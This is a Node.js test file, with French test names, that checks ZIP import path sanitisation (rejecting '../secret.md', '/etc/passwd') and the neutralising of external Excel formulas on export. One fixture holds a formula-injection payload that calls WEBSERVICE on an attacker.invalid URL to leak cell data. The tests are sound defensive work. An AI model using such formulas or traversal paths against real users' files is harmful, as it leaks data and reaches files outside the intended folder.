const test = require('node:test')
const assert = require('node:assert/strict')
const fs = require('node:fs')
const os = require('node:os')
const path = require('node:path')
const ExcelJS = require('exceljs')
const JSZip = require('jszip')
const { normalizeEntryPath, readBoundedZip } = require('../safeZip')
const { spreadsheetToXlsxBuffer } = require('../spreadsheetXlsx')

test('les chemins dangereux sont refusés dans les ZIP importés', () => {
  assert.equal(normalizeEntryPath('../secret.md'), null)
  assert.equal(normalizeEntryPath('/etc/passwd'), null)
  assert.equal(normalizeEntryPath('C:/secret.md'), null)
  assert.equal(normalizeEntryPath('Cours/Chapitre.md'), 'Cours/Chapitre.md')
})

test('un ZIP normal est lu avec des limites de décompression', async t => {
  const directory = fs.mkdtempSync(path.join(os.tmpdir(), 'opuscule-zip-test-'))
  t.after(() => fs.rmSync(directory, { recursive: true, force: true }))
  const archivePath = path.join(directory, 'notes.zip')
  const zip = new JSZip()
  zip.file('Cours/note.md', '# Une note courte et valide')
  fs.writeFileSync(archivePath, await zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' }))
  const entries = await readBoundedZip(archivePath)
  assert.equal(entries.length, 1)
  assert.equal(entries[0].relativePath, 'Cours/note.md')
})

test('les formules Excel externes sont neutralisées mais les formules locales restent actives', async () => {
  const document = {
    philoweek_type: 'spreadsheet',
    version: 1,
    title: 'Sécurité',
    sheets: [{
      name: 'Feuille 1',
      rowCount: 3,
      columnCount: 2,
      cells: {
        A1: { input: '=WEBSERVICE("https://attacker.invalid/?x="&B1)' },
        A2: { input: '=SUM(B1:B2)' },
      },
    }],
  }
  const buffer = await spreadsheetToXlsxBuffer(JSON.stringify(document))
  const workbook = new ExcelJS.Workbook()
  await workbook.xlsx.load(buffer)
  const sheet = workbook.getWorksheet('Feuille 1')
  assert.equal(sheet.getCell('A1').value, '\'=WEBSERVICE("https://attacker.invalid/?x="&B1)')
  assert.equal(sheet.getCell('A2').value.formula, 'SUM(B1:B2)')
})
